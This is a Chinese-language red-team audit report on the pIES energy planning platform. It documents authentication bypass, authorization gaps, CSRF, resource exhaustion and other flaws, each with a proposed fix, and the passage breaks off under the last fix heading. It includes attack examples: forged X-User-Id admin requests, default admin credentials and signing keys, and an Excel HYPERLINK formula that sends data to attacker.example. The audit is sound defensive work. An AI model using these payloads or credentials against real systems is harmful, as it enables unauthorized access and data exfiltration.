# pIES 综合能源规划平台安全与权限红队审查报告

## 1. 审查范围与方法

本次审查为**只读静态代码审查**，未修改业务代码，也未进行动态攻击、Docker 构建或运行时验证。

审查范围：

- `backend/iesplan/api/*.py`
- `backend/iesplan/services/*.py`
- `backend/iesplan/core/security.py`
- `backend/iesplan/core/expression.py`
- `backend/iesplan/core/registry.py`
- `frontend/src/api/client.ts`
- 结合 `docker-compose.yml`、`main.py`、数据库初始化及 Worker 代码检查部署边界

设计基线：

- RPD 第 3 节：用户、角色、项目权限、单活动窗口、会话接管；
- RPD 第 13 节：诊断、审计、敏感信息保护；
- RPD 第 17.9 节：资源限制、可复现性、内容寻址、不可变性和受控扩展。

> 行号以当前工作区代码为准。由于工作区存在其他未提交修改，后续代码变更可能导致行号漂移。

---

# 2. 结论摘要

当前系统存在多项会直接影响生产安全的缺陷：

- 存在**无需有效会话即可伪造管理员身份**的兼容认证逻辑；
- 默认管理员密码公开且后端未强制首次改密；
- 模型 API 缺少项目级授权检查，查看者甚至未授权用户可能修改模型；
- 项目包下载签名使用默认弱密钥，且下载授权不绑定项目或用户；
- 会话接管确认前的新会话已经拥有完整业务权限；
- Cookie 认证缺少 CSRF 防护；
- 登录限速是进程内状态，部署多 Worker 后可绕过；
- 项目包和 CSV 存在明显的内存、CPU、压缩炸弹和响应放大风险；
- 若干任务、所有权转移和成员授权接口存在边界校验不足。

综合评级：**D：高风险，不建议在修复严重和高危问题前暴露给不受信任网络或多用户生产环境。**

---

# 3. 严重问题

## C-01：管理员对象运维 API 可通过 `X-User-Id` 伪造管理员身份

**严重度：严重**

### 位置

- `backend/iesplan/api/objects.py:51-81`
- `backend/iesplan/api/objects.py:126-155`
- `backend/iesplan/main.py:239-262`

### 问题描述

`get_current_admin()` 首先调用真实会话认证，但捕获了所有 `AppError`：

```python
try:
    ctx = get_auth_context(request, db)
    user = ctx.user
except AppError:
    user = None
```

认证失败后，代码回退到读取客户端提交的：

```python
X-User-Id
```

随后只根据该用户 ID 查询数据库并判断是否拥有管理员角色。

这意味着 `X-User-Id` 实际上成为了一个未经签名、未经认证的身份输入。

### 攻击场景

攻击者无需 Cookie 或 Bearer Token，即可尝试：

```http
GET /api/admin/storage
X-User-Id: 1
```

如果管理员用户 ID 可预测，例如种子管理员通常为 `1`，则可以读取管理员存储和健康信息。

进一步提交：

```http
POST /api/admin/objects/cleanup
X-User-Id: 1
Content-Type: application/json

{"dry_run": false}
```

可能执行对象清理，造成对象文件和数据库记录删除。

### 修复建议

1. 删除生产代码中的 `X-User-Id` 兼容认证。
2. 认证失败必须直接返回 `401`，禁止回退到客户端声明的用户 ID。
3. 测试身份注入只能在独立测试配置中启用，并且使用不可伪造的服务端机制。
4. 对对象清理增加：
   - 管理员真实会话；
   - 二次确认 nonce；
   - 操作原因；
   - 不可变审计；
   - 删除前引用检查和事务保护。
5. 检查所有同一路径的重复路由，避免“兼容路由”绕过正式认证。

---

## C-02：公开硬编码管理员初始密码，且后端不强制首次改密

**严重度：严重**

### 位置

- `backend/iesplan/config.py:37-38`
- `backend/iesplan/db.py:50-100`
- `backend/iesplan/api/auth.py:150-184`
- `backend/iesplan/api/auth.py:246-269`
- `backend/iesplan/services/identity.py:595-604`

### 问题描述

默认管理员密码为：

```text
iesplan-admin-initial
```

数据库种子逻辑会创建：

- 用户名：`admin`
- 默认密码：`iesplan-admin-initial`
- `requires_change=True`

但 `get_auth_context()` 只校验：

- 会话状态；
- 会话过期时间；
- 用户状态；
- `credential_version`。

没有检查当前密码凭证的 `requires_change` 状态。

`force_password_change` 或类似字段只在响应中告知前端，并未在后端统一阻断业务接口。

### 攻击场景

攻击者登录默认管理员账号后，即使不访问改密接口，也可以直接调用：

- 项目管理接口；
- 用户和角色管理接口；
- 对象清理接口；
- 导出接口；
- 所有维护接口。

管理员重置出的临时密码也存在同样问题：如果临时密码泄露，攻击者可以在改密前直接使用完整业务权限。

### 修复建议

1. 生产环境禁止固定默认密码。
2. 首次启动时：
   - 通过安装流程设置管理员密码；或
   - 生成一次性随机初始密码并仅通过安全渠道展示。
3. 服务端统一执行：

   ```text
   requires_change == true
   ```

   时只允许：
   - 修改密码；
   - 登出；
   - 必要的身份信息接口。
4. 改密成功后：
   - 提升会话状态为正式会话；
   - 或强制重新登录；
   - 撤销所有旧会话。
5. 启动检查拒绝已知默认密码和弱密钥配置。

---

## C-03：模型 API 缺少项目授权检查，查看者可写并存在跨项目越权

**严重度：严重**

### 位置

- `backend/iesplan/api/model.py:135-166`
- `backend/iesplan/api/model.py:169-198`
- `backend/iesplan/api/model.py:206-240`
- `backend/iesplan/api/model.py:248-252`
- `backend/iesplan/services/model.py:514-597`
- `backend/iesplan/services/model.py:617-668`

### 问题描述

模型路由虽然注入了 `CurrentUser`，但没有调用：

```python
project_service.ensure_access(db, user, project_id, "view")
project_service.ensure_access(db, user, project_id, "edit")
```

例如创建设备接口直接调用：

```python
svc.create_device(...)
```

其中 `user.id` 仅用于记录 `created_by`，没有参与权限判定。

模型服务层也主要根据 `project_id`、设备 ID、端口 ID 和连接 ID 判断资源归属，没有接收调用者授权上下文。

### 攻击场景

拥有任意有效账号的用户，或者仅有 viewer 权限的用户，可以直接提交：

```http
POST /api/projects/{project_id}/model/devices
PUT /api/projects/{project_id}/model/devices/{device_id}
DELETE /api/projects/{project_id}/model/devices/{device_id}
POST /api/projects/{project_id}/model/connections
DELETE /api/projects/{project_id}/model/connections/{conn_id}
```

结果包括：

- viewer 修改或删除能源模型；
- 用户尝试枚举其他项目 ID；
- 管理员通过普通模型 API 修改项目模型，绕过“管理员维护入口只读”设计；
- 模型、拓扑和后续计算快照被篡改。

### 修复建议

所有模型接口必须显式执行：

- 读取、模型诊断：`ensure_access(..., "view")`
- 创建设备、更新、删除、连接、断开：`ensure_access(..., "edit")`

建议不要仅依赖 API 层校验，服务层也应接收授权上下文，或者统一通过授权后的 command/facade 调用。

必须增加回归测试：

- owner：读写允许；
- viewer：读取允许，写入全部返回 `403`；
- 非成员：不能读取或修改；
- 管理员：维护接口可用，但普通业务 API 不能修改项目模型；
- A 项目资源不能通过 B 项目 URL 访问。

---

## C-04：默认 HMAC 密钥和不绑定项目的下载 Token 可导致跨项目对象下载

**严重度：严重**

### 位置

- `backend/iesplan/config.py:25-26`
- `docker-compose.yml:38,56,75`
- `backend/iesplan/services/package.py:114-162`
- `backend/iesplan/api/exports.py:79-94`
- `backend/iesplan/api/exports.py:109-124`

### 问题描述

默认签名密钥为：

```text
dev-only-secret-change-me
```

下载 Token 只包含：

```json
{
  "object_id": 123,
  "kind": "package",
  "exp": 1234567890
}
```

缺少：

- `project_id`
- 用户 ID；
- 会话 ID 或凭证版本；
- 权限版本；
- 一次性 nonce；
- 撤销状态。

下载接口也没有注入 `CurrentUser`，只验证 HMAC，然后根据 `object_id` 读取对象。

URL 中的 `project_id` 只用于生成文件名，不验证对象是否属于该项目。

### 攻击场景

1. 默认密钥未被覆盖时，攻击者可以伪造任意对象 ID 的签名 Token。
2. 攻击者枚举对象 ID 后，可能下载其他项目的：
   - Excel 报告；
   - 完整项目包；
   - 模型；
   - 数据集；
   - 历史结果；
   - 证据包。
3. 即使密钥已更换，Token 一旦出现在浏览器历史、代理日志、Referer 或错误上报中，持有者仍可在有效期内匿名下载。

### 修复建议

1. 启动时拒绝默认或弱 `secret_key`。
2. 下载 Token 绑定：
   - `project_id`
   - `object_id`
   - `kind`
   - 签发用户；
   - 会话或权限版本；
   - 过期时间；
   - 一次性随机 nonce。
3. 下载时重新验证当前会话和项目权限。
4. 查询对象引用，确认对象确实属于 URL 指定的项目。
5. 对项目包下载强制登录，避免将完整项目包作为匿名 bearer capability。
6. 避免把 Token 放在查询字符串中，改用一次性下载句柄或受控 `Authorization` 头。
7. 使用 `hmac.compare_digest()` 校验签名。

---

# 4. 高危问题

## H-01：接管确认前的新会话已经拥有完整业务权限

**严重度：高**

### 位置

- `backend/iesplan/services/identity.py:749-817`
- `backend/iesplan/api/auth.py:246-269`
- `backend/iesplan/api/auth.py:321-340`
- `frontend/src/pages/LoginPage.tsx:153-156`

### 问题描述

新登录时，旧活动会话被置为 `takeover_pending`，但新会话立即被创建为 `active`：

```python
session, token, displaced = identity.create_window_session(...)
```

登录响应同时返回完整 Token 和：

```json
{
  "needs_takeover_confirm": true
}
```

`get_auth_context()` 只要求：

```python
session.status == "active"
```

并不检查 `needs_takeover_confirm` 或接管状态。

### 攻击场景

自定义客户端可以忽略 `needs_takeover_confirm`，直接使用登录返回的 Token 调用：

- 修改项目；
- 添加或删除成员；
- 提交计算任务；
- 归档或删除项目；
- 导出数据；
- 修改配置。

这违反“确认接管后才接受新窗口操作”的服务端语义。

### 修复建议

引入严格状态机：

```text
pre_authenticated
takeover_pending
active
revoked
expired
```

接管确认前：

- 只签发受限预接管凭证；
- 所有业务 API 拒绝该凭证；
- 只允许重新加载服务端最新修订和确认接管；
- 确认后再签发正式活动窗口 Token。

确认应使用一次性 nonce，并绑定用户、设备和会话。

---

## H-02：会话级 generation/fencing 不完整，并发接管存在竞态

**严重度：高**

### 位置

- `backend/iesplan/api/auth.py:137-142`
- `backend/iesplan/services/identity.py:699-713`
- `backend/iesplan/services/identity.py:731-817`
- `backend/iesplan/models/identity.py:187-200`

### 问题描述

系统已有：

- Token 哈希存储；
- 会话状态；
- `credential_version`；
- Worker 任务租约和 fencing token。

但会话接管没有独立的单调：

- `session_generation`
- `window_epoch`
- `takeover_generation`

也没有看到针对用户的行锁、分布式锁或原子 generation 更新。

普通请求只校验 Token 对应会话的 `active` 状态，不在写操作提交时重新验证当前活动窗口 generation。

### 攻击场景

两个 Worker 或两个 API 进程同时处理同一账号登录：

1. 两者同时读取旧活动窗口；
2. 两者都认为可以创建新窗口；
3. 竞相置换旧会话并创建新会话；
4. 可能出现多个活动窗口、唯一约束异常或会话状态不一致。

并发中的旧请求或异步写请求也缺少统一的窗口代次约束。

### 修复建议

1. 在用户或账户安全记录上使用 `SELECT ... FOR UPDATE`。
2. 使用数据库原子递增的 `session_generation`。
3. 每个会话 Token 携带 generation。
4. 每个敏感写操作提交前重新验证：
   - 会话仍为当前活动窗口；
   - generation 未变化；
   - 凭证版本未变化。
5. 异步任务提交和结果落库也记录并验证窗口/授权版本。
6. 对并发唯一约束冲突返回明确的会话冲突，不返回 500。

> 当前 Worker 任务租约本身已经使用 `lease_token` 做 fencing，这部分是正向控制；本问题针对的是用户会话级 fencing，而非 Worker 任务租约。

---

## H-03：登录限速为单进程、仅按用户名，容易绕过并可被用于账号锁定 DoS

**严重度：高**

### 位置

- `backend/iesplan/services/identity.py:150-206`
- `backend/iesplan/services/identity.py:625-691`
- `docker-compose.yml:31-38`

### 问题描述

限速状态保存在：

```python
_LOGIN_FAILURES: dict[str, list[float]]
_LOGIN_LOCKED_UNTIL: dict[str, float]
```

Docker 中后端使用：

```text
uvicorn ... --workers 2
```

每个 Worker 拥有独立内存状态，重启后限速状态消失。

限速主要按用户名处理，没有：

- IP 限速；
- 用户名/IP 组合限速；
- 设备或指纹限速；
- 全局入口限速；
- 反向代理连接限制；
- Redis/数据库原子计数。

### 攻击场景

1. 攻击者轮换请求到不同 Worker，使失败次数被分散。
2. 重启服务后锁定状态消失。
3. 攻击者反复对管理员账号发送错误密码，触发五次失败锁定十五分钟，造成账号锁定 DoS。
4. 对大量随机用户名尝试登录，可能持续触发 bcrypt dummy 校验和 `auth_events` 写入，造成 CPU 或数据库压力。

### 修复建议

使用 Redis 或数据库进行原子计数和 TTL：

- 用户名级；
- IP 级；
- 用户名/IP 组合；
- 全局登录入口。

同时配置：

- 反向代理速率限制；
- 最大并发连接；
- 失败事件聚合；
- 对不存在用户的审计采样；
- 避免仅依赖固定次数账号锁定。

---

## H-04：Cookie 认证缺少 CSRF 防护

**严重度：高**

### 位置

- `backend/iesplan/api/auth.py:228-238`
- `backend/iesplan/api/auth.py:272-290`
- `backend/iesplan/main.py:180-195`
- `frontend/src/api/client.ts:247-267`

### 问题描述

系统使用 Cookie 认证：

```typescript
credentials: "include"
```

Cookie 设置了：

```text
HttpOnly
SameSite=Lax
```

但未发现：

- CSRF Token；
- 双提交 Cookie；
- Origin 校验；
- Referer 校验；
- CSRF 中间件。

CORS 不是 CSRF 防护。CORS 只限制跨源读取，不阻止浏览器在特定场景下携带 Cookie 发起请求。

### 攻击场景

恶意网站可能诱导已登录浏览器发起状态修改请求，例如：

- 登出；
- 项目归档、删除；
- 成员添加或移除；
- 所有权转移；
- 任务取消；
- 安全设置修改。

跨站 JSON 请求通常会受到预检限制，但不能将此作为完整防护。跨子域、同站攻击、未来新增表单型接口和登录 CSRF 仍存在风险。

### 修复建议

1. Cookie 认证的所有状态修改请求增加 CSRF Token。
2. 对非 GET 请求校验 `Origin`，必要时校验 `Referer`。
3. 将 Cookie API 与 Bearer-only API 分离。
4. 生产环境强制 HTTPS 和 `Secure=True`。
5. 不要把 `SameSite=Lax` 当作唯一 CSRF 防护。

---

## H-05：任务取消接口缺少项目权限检查，viewer 可能取消他人任务

**严重度：高**

### 位置

- `backend/iesplan/api/tasks.py:132-150`
- `backend/iesplan/services/tasks.py:554-562`
- `backend/iesplan/services/tasks.py:929-975`

### 问题描述

任务取消接口执行：

```python
tasks_service.ensure_task_belongs(db, project_id, task_id)
task = tasks_service.cancel_task(...)
```

`ensure_task_belongs()` 只检查任务是否属于 URL 中的项目，不检查当前用户是否具有项目编辑或任务管理权限。

`cancel_task()` 也不接收用户授权上下文。

### 攻击场景

项目 viewer 可以调用：

```http
POST /api/projects/{project_id}/tasks/{task_id}/cancel
```

导致：

- 取消 owner 提交的计算；
- 取消批量任务及其子任务；
- 干扰计算资源调度；
- 破坏任务结果生成流程。

### 修复建议

取消任务应至少要求：

```python
ensure_access(db, user, project_id, "edit")
```

或者定义独立的 `manage_tasks` 能力。

权限检查应放在服务层，而不是只依赖路由层。取消、重试、批量传播均应在同一授权事务中完成。

---

## H-06：Cookie 的 `Secure` 属性依赖请求 scheme，默认部署实际为 HTTP

**严重度：高**

### 位置

- `backend/iesplan/api/auth.py:228-238`
- `docker-compose.yml:31-40,87-90`
- `frontend/nginx.conf:1-16`

### 问题描述

Cookie 设置为：

```python
secure=request.url.scheme == "https"
```

默认 Docker 部署通过 Nginx 的 HTTP 端口提供服务：

```text
localhost:8080 -> web:80
```

后端没有明确配置可信反向代理头的证据。即使外层未来部署 TLS，如果后端识别到的 scheme 仍为 HTTP，也可能错误地不设置 `Secure`。

### 攻击场景

在局域网或不可信网关环境中：

- `ies_session` 可能通过明文 HTTP 传输；
- 网络监听者可窃取会话 Cookie；
- 窃取的会话可直接调用所有业务接口。

### 修复建议

1. 生产环境强制 HTTPS。
2. Cookie 在生产配置中固定：

   ```text
   Secure=True
   HttpOnly=True
   SameSite=Lax 或 Strict
   ```

3. 正确配置 Uvicorn/反向代理的可信 forwarded headers。
4. HTTP 请求重定向或拒绝登录。
5. 启动时检查生产环境是否仍使用 HTTP `app_url`。

---

## H-07：项目包导入存在 ZIP Bomb 和资源耗尽风险

**严重度：高**

### 位置

- `backend/iesplan/api/projects.py:360-390`
- `backend/iesplan/api/projects.py:371`
- `backend/iesplan/services/package.py:612-637`
- `frontend/nginx.conf:7-8`

### 问题描述

上传接口直接执行：

```python
data = file.file.read()
```

项目包解析随后：

```python
for info in zf.infolist():
    entries[info.filename] = zf.read(info)
```

在 manifest、对象哈希和项目结构校验前，所有条目都会被完整解压到内存。

未发现对以下项目设置有效限制：

- 压缩包大小；
- ZIP 条目数量；
- 单条目展开大小；
- 总展开大小；
- 压缩比；
- 解压 CPU 时间；
- 重复文件名；
- 嵌套压缩包；
- 加密 ZIP；
- 临时磁盘配额。

Nginx 允许的请求体大小达到 2GB，进一步扩大风险。

### 攻击场景

攻击者上传几十 KB 的高压缩比 ZIP，解压后达到数 GB，或者包含几十万条小文件。

结果可能包括：

- API 容器 OOM；
- CPU 长时间占用；
- 临时磁盘耗尽；
- 数据库长事务；
- 其他用户无法登录、上传或提交计算。

当前未发现经典 `extractall()` 形式的 ZipSlip 任意写文件，但 ZIP Bomb 风险本身已经成立。

### 修复建议

在任何 `zf.read(info)` 之前执行门禁：

- 最大压缩包大小；
- 最大条目数；
- 最大单条目展开大小；
- 最大总展开大小；
- 最大压缩比；
- 最大解析时间；
- 最大嵌套层数；
- 拒绝加密 ZIP 和未知压缩算法。

采用流式读取并按实际读取字节数硬限制。最好在独立、低权限、有限内存和 CPU 的 I/O Worker 中解析。

---

## H-08：CSV 上传在大小检查前完整读入内存，解析产生多份副本

**严重度：高**

### 位置

- `backend/iesplan/api/datasets.py:46-47`
- `backend/iesplan/api/datasets.py:241-277`
- `backend/iesplan/services/dataset.py:293-374`
- `backend/iesplan/services/dataset.py:374-493`
- `frontend/nginx.conf:7-8`

### 问题描述

虽然定义了：

```python
_MAX_UPLOAD_BYTES = 512 * 1024 * 1024
```

但检查顺序为：

```python
data = file.file.read()
if len(data) > _MAX_UPLOAD_BYTES:
    reject
```

大小检查发生在完整读取之后。

后续解析还可能同时产生：

- 原始 `bytes`；
- 解码后的字符串；
- `StringIO`；
- `rows` 列表；
- DataFrame；
- 规范化 DataFrame；
- 规范化 CSV；
- 诊断列表。

### 攻击场景

攻击者上传接近 512MB 的 CSV，或者使用少量极长字段、大量重复行、多份并发上传，使容器内存快速耗尽。

即使文件超过限制，也已经在返回 400 前完成了完整读取。

### 修复建议

1. 使用分块读取并在达到上限时立即终止。
2. 上传先落盘到隔离临时文件并计算哈希。
3. 限制：
   - 文件字节数；
   - 行数；
   - 列数；
   - 单行长度；
   - 单字段长度；
   - 解析时间；
   - 用户并发上传数。
4. 避免同时保留原始内容、rows 和 DataFrame。
5. 大文件处理放入受限 I/O Worker。

---

## H-09：普通所有者转移项目时未验证目标用户的有效角色和状态

**严重度：高**

### 位置

- `backend/iesplan/services/project.py:180-242`
- `backend/iesplan/api/projects.py:312-325`

### 问题描述

`transfer_ownership()` 只检查目标用户存在：

```python
target = db.get(User, target_user_id)
```

没有验证：

- 目标用户处于 `active`；
- 目标具有 engineer 角色；
- 目标不是系统账号；
- 目标不是不适当的管理员账号；
- 目标凭证有效。

### 攻击场景

项目 owner 可以把项目转给：

- 已停用用户，导致项目无法继续维护；
- 非工程师角色，破坏角色模型；
- 系统管理员账号，绕过管理员维护只读设计；
- 不适当的系统用户。

### 修复建议

目标必须同时满足：

```text
status = active
具有 engineer 角色
非系统账号
符合项目所有权转移策略
```

普通 owner 转移到 admin 应明确禁止。转移操作应记录：

- 原 owner；
- 新 owner；
- 双方状态和角色；
- 权限版本；
- 会话 ID；
- 审计请求 ID。

---

## H-10：管理员所有权转移接口未强制“原 owner 已停用”

**严重度：高**

### 位置

- `backend/iesplan/api/admin.py:268-346`
- `backend/iesplan/api/admin.py:280-294`

### 问题描述

设计要求管理员维护入口只能在原 owner 已停用的情况下，经过明确审计操作将项目转移给有效工程师。

当前接口未看到强制检查：

- 原 owner 是否已停用；
- 目标用户是否为 active engineer；
- 目标是否为系统账号；
- 目标是否为不适当管理员；
- 转移理由或工单号。

### 攻击场景

普通 owner 仍在使用项目时，管理员接口即可夺取所有权。管理员账号被入侵后，可将项目转移给攻击者控制的账户。

### 修复建议

服务端强制要求：

1. 原 owner `status == disabled`；
2. 目标用户 `status == active`；
3. 目标具有 engineer 角色；
4. 目标不是系统账号；
5. 记录转移理由、工单号和审批信息；
6. 写入不可变维护审计；
7. 对原 owner、目标用户和项目权限版本进行一致性校验。

---

# 5. 中危问题

## M-01：`ProjectMember.expires_at` 未参与权限判定，临时授权可能永久有效

**严重度：中**

### 位置

- `backend/iesplan/models/project.py:152-183`
- `backend/iesplan/services/project.py:82-91`
- `backend/iesplan/services/project.py:245-270`
- `backend/iesplan/services/project.py:358-370`

### 问题描述

当前成员查询主要检查：

```python
revoked_at.is_(None)
```

没有检查：

```text
expires_at IS NULL OR expires_at > now()
```

### 攻击场景

为用户设置的临时 viewer 授权到期后，用户仍可能继续：

- 查看项目；
- 查看结果；
- 下载 Excel；
- 读取项目成员；
- 访问任务和诊断。

### 修复建议

统一使用“当前有效成员”查询：

```sql
revoked_at IS NULL
AND (expires_at IS NULL OR expires_at > CURRENT_TIMESTAMP)
```

所有项目、数据集、任务、结果、导出接口均应使用该查询，并增加过期授权回归测试。

---

## M-02：幂等键全局唯一，命中时未校验项目、用户和请求指纹

**严重度：中**

### 位置

- `backend/iesplan/services/tasks.py:591-635`
- `backend/iesplan/models/calc.py:150-155`
- `backend/iesplan/api/tasks.py:71-99`
- `backend/iesplan/services/tasks.py:1151-1178`

### 问题描述

任务幂等键查询为：

```python
select(Task).where(Task.idempotency_key == idempotency_key)
```

模型还对 `idempotency_key` 建立全局唯一约束。

命中后直接返回已有任务，没有验证：

- `existing.project_id == project_id`
- `existing.requested_by == user.id`
- `task_type` 是否一致；
- 配置请求摘要是否一致。

### 攻击场景

用户在自己有权限的项目中提交一个已知或猜测到的幂等键，可能获得其他项目任务的摘要，包括：

- 任务 ID；
- 状态；
- 请求人；
- 计算快照 ID；
- trace ID；
- 时间和尝试信息。

此外，一个项目可以占用另一个项目的幂等键，形成跨项目 DoS 或错误复用。

### 修复建议

1. 将幂等键作用域改为：

```text
(project_id, requested_by, idempotency_key)
```

或明确使用项目级作用域。
2. 保存规范化请求指纹。
3. 命中时验证：
   - 项目；
   - 用户；
   - 类型；
   - 配置摘要。
4. 不一致返回 `409 Conflict`。
5. 不必要时不要返回 `requested_by`、`trace_id` 和原始幂等键。

---

## M-03：任务详情向 viewer 原样返回 `stack_trace` 和内部 context

**严重度：中**

### 位置

- `backend/iesplan/services/tasks.py:565-588`
- `backend/iesplan/services/tasks.py:1210-1276`
- `backend/iesplan/api/tasks.py:120-129`

### 问题描述

任务诊断返回：

```python
{
    "stack_trace": d.stack_trace,
    "context": d.context
}
```

项目 viewer 也可以查看任务详情，因此可能获取：

- 服务端绝对路径；
- 模块名和内部代码结构；
- 数据库或求解器错误；
- 内部对象 ID；
- 未来异常中包含的配置、路径或敏感参数。

### 攻击场景

viewer 读取失败任务详情，利用堆栈、路径和内部对象标识辅助后续攻击或信息收集。

### 修复建议

普通用户只返回：

- 稳定诊断码；
- 脱敏消息；
- 严重度；
- blocking 状态；
- 恢复建议；
- 脱敏对象定位。

完整堆栈只能通过受控管理员审计接口访问，并对 `context` 做字段白名单和长度限制。

---

## M-04：管理员普通项目查看接口可能读取完整模型和财务参数

**严重度：中**

### 位置

- `backend/iesplan/services/project.py:70-79`
- `backend/iesplan/services/project.py:109-126`
- `backend/iesplan/services/project.py:342-355`
- `backend/iesplan/api/projects.py:153-160`

### 问题描述

全局 admin 在 `ensure_access()` 中获得：

```text
maintenance_admin: view, maintenance
```

普通项目 GET 接口随后返回：

- 当前草稿；
- 完整模型内容；
- 项目版本；
- 配置相关数据。

这超出了设计中“管理员通过维护入口查看诊断，不能直接编辑能源模型或财务参数”的最小权限边界。

### 攻击场景

管理员或被盗管理员凭证调用普通项目查看接口，读取完整能源模型、财务参数、数据集引用和版本内容。

虽然这是读取而非写入，但扩大了敏感数据暴露面，并绕过了维护入口的审计语义。

### 修复建议

- 管理员普通项目 API 不自动拥有完整业务 `view`。
- 单独提供最小化维护诊断 DTO。
- 若确需查看项目模型，使用独立、审计、脱敏、限范围接口。
- 对管理员查看完整模型增加理由、工单号和审计记录。

---

## M-05：查看者可触发持久化校验报告，违反严格只读语义

**严重度：中**

### 位置

- `backend/iesplan/api/validation.py:54-67`
- `backend/iesplan/services/validation.py:743-763`

### 问题描述

校验运行接口只要求：

```python
ensure_access(db, user, project_id, "view")
```

但 `store_validation_report()` 会：

- 序列化校验报告；
- 创建内容寻址对象；
- 创建项目对象引用；
- 提交数据库记录。

因此 viewer 虽不能编辑模型，却能通过 POST 产生持久化副作用。

### 攻击场景

viewer 重复调用校验接口，造成：

- 对象存储和数据库写入；
- 审计记录膨胀；
- 高成本模型校验；
- 项目对象引用变化；
- 存储资源消耗。

### 修复建议

二选一：

1. 将“运行并持久化报告”定义为编辑操作，要求 `edit`；
2. 允许 viewer 运行临时校验，但：
   - 不落库；
   - 不创建对象引用；
   - 限制频率、并发和执行时间；
   - 对相同输入复用缓存结果。

---

## M-06：对象物理路径缺少根目录约束，存在潜在任意文件读/删纵深风险

**严重度：中**

### 位置

- `backend/iesplan/services/objects.py:163-165`
- `backend/iesplan/services/objects.py:168-182`
- `backend/iesplan/services/objects.py:409-424`
- `backend/iesplan/services/objects.py:690-699`
- `backend/iesplan/services/dataset.py:742-754`

### 问题描述

物理路径由数据库字段拼接：

```python
return settings.data_dir / (
    obj.storage_path or f"objects/{obj.sha256}"
)
```

缺少：

- `resolve()` 后的根目录包含性校验；
- 绝对路径拒绝；
- `..` 校验；
- 符号链接防护；
- `storage_path` 与内容哈希一致性校验。

正常上传路径目前通常为 `objects/{digest}`，尚未确认普通用户可以直接控制 `storage_path`，因此这是潜在纵深风险，不是当前已确认的直接任意文件读取漏洞。

### 攻击场景

如果数据库被污染、迁移数据被恶意构造，或者未来导入功能允许恢复存储路径，攻击者可能诱导：

- 读取容器配置文件；
- 删除对象根目录外的文件；
- 访问其他挂载数据。

### 修复建议

最好完全根据 SHA-256 计算路径，不从数据库恢复物理路径。

如必须兼容 `storage_path`：

1. SHA-256 严格匹配 `[0-9a-f]{64}`；
2. 使用 `resolve(strict=False)`；
3. 确认路径位于对象根目录；
4. 拒绝绝对路径、`..`、符号链接；
5. 删除前再次校验；
6. 使用 `O_NOFOLLOW` 等机制防止链接逃逸。

---

## M-07：项目包 JSON 结构和数量缺少统一资源限制

**严重度：中**

### 位置

- `backend/iesplan/services/package.py:642-695`
- `backend/iesplan/services/package.py:751-819`
- `backend/iesplan/services/package.py:903-949`
- `backend/iesplan/services/package.py:1003-1051`

### 问题描述

项目包内多个 JSON 文档直接使用：

```python
json.loads(...)
```

未发现统一限制：

- JSON 文档字节数；
- JSON 最大深度；
- 对象数量；
- 版本数量；
- 数据集数量；
- 证据数量；
- 数组大小；
- 字符串长度；
- 单个版本内容大小；
- 导入事务最大行数。

### 攻击场景

攻击者可以生成包内哈希完全自洽、但结构恶意的项目包，例如：

- 数十万对象清单；
- 数十万版本条目；
- 超深嵌套 JSON；
- 超长项目描述；
- 大量证据评估；
- 大量数组元素。

哈希校验只能证明内容一致，不能证明内容结构安全。

### 修复建议

- 使用严格 Pydantic 模型或 JSON Schema；
- 为字段设置类型、枚举、长度和数值范围；
- 限制对象、数据集、版本、证据和数组数量；
- 限制 JSON 深度和总大小；
- 在产生 Project、Dataset、Version、ObjectRef 之前完成完整预检；
- 导入使用批次、超时和事务行数配额。

---

## M-08：数值字段可能接受 NaN/Infinity，绕过范围校验

**严重度：中**

### 位置

- `backend/iesplan/api/model.py:48-52`
- `backend/iesplan/services/model.py:145-158`
- `backend/iesplan/services/model.py:475-496`
- `backend/iesplan/services/model.py:695-728`
- `backend/iesplan/services/config.py:401-404`
- `backend/iesplan/services/config.py:493-560`
- `backend/iesplan/services/package.py:642-644`

### 问题描述

多处检查只判断：

```python
isinstance(value, (int, float))
```

然后执行大小比较。对于 `NaN`，很多比较结果为 `False`，可能绕过：

```python
value < min
value > max
0 <= value <= 1
```

Python 默认 JSON 解析也可能接受非标准常量 `NaN` 和 `Infinity`。

### 攻击场景

提交：

```json
{
  "capacity": NaN,
  "loss_rate": NaN
}
```

可能导致：

- 非有限值进入数据库或 JSON；
- 求解器、Pandas、NumPy 或 Excel 导出异常；
- 计算结果不可复现；
- 哈希和规范化序列化不稳定；
- 后续任务 500。

### 修复建议

所有外部数值入口统一要求：

```python
isinstance(value, (int, float))
and not isinstance(value, bool)
and math.isfinite(float(value))
```

覆盖：

- 坐标；
- 设备参数；
- 连接容量和损耗率；
- 随机种子；
- 经济和环境参数；
- 容差；
- 项目包版本与元数据。

项目包 JSON 解析应拒绝非标准常量。

---

## M-09：Excel 导出存在公式注入风险

**严重度：中**

### 位置

- `backend/iesplan/services/package.py:1121-1132`
- `backend/iesplan/services/package.py:1209-1247`
- `backend/iesplan/services/package.py:1277-1307`
- `backend/iesplan/services/package.py:1321-1324`

### 问题描述

用户可控字符串被直接写入 Excel 单元格，没有统一处理以以下字符开头的值：

```text
= + - @
```

可能受影响的来源包括：

- 项目名；
- 版本说明；
- KPI 名称和单位；
- 设备名称；
- 数据集许可证和 provenance；
- 证据摘要；
- 评估意见。

### 攻击场景

恶意项目 owner 设置项目名：

```text
=HYPERLINK("https://attacker.example/?x="&A1,"点击查看")
```

查看者导出并用 Excel 或 LibreOffice 打开时，可能触发：

- 外部网络请求；
- 数据外带；
- 钓鱼链接；
- 公式执行。

这属于客户端文件风险，不是后端服务器 RCE。

### 修复建议

统一封装安全单元格写入函数：

- 对用户可控字符串检测 `=`, `+`, `-`, `@` 前缀；
- 必要时前置单引号；
- 清理制表符、换行和控制字符；
- 强制 `cell.data_type = "s"`；
- 所有写入路径都必须经过该封装；
- 增加恶意项目名、设备名和评论的导出测试。

---

## M-10：Redis 未配置认证或 ACL，内部网络被攻破后可篡改队列和状态

**严重度：中**

### 位置

- `docker-compose.yml:20-29`
- `docker-compose.yml:35-38,53-57,72-75`
- `backend/iesplan/services/queue.py:1-15`

### 问题描述

Redis 使用：

```text
redis://redis:6379/0
```

没有密码、ACL、TLS 或独立网络隔离配置。

Redis 未暴露宿主机端口，降低了外部直接攻击面；但任一后端、Worker 或同 Docker 网络服务被入侵后，即可访问 Redis。

### 攻击场景

攻击者取得容器内任一服务权限后，可以：

- 删除队列消息；
- 插入伪造任务消息；
- 修改取消信号；
- 篡改进度和心跳；
- 造成任务 DoS 或错误调度。

当前设计中 PostgreSQL 是任务权威事实，限制了部分影响，但不能防止队列层面的干扰。

### 修复建议

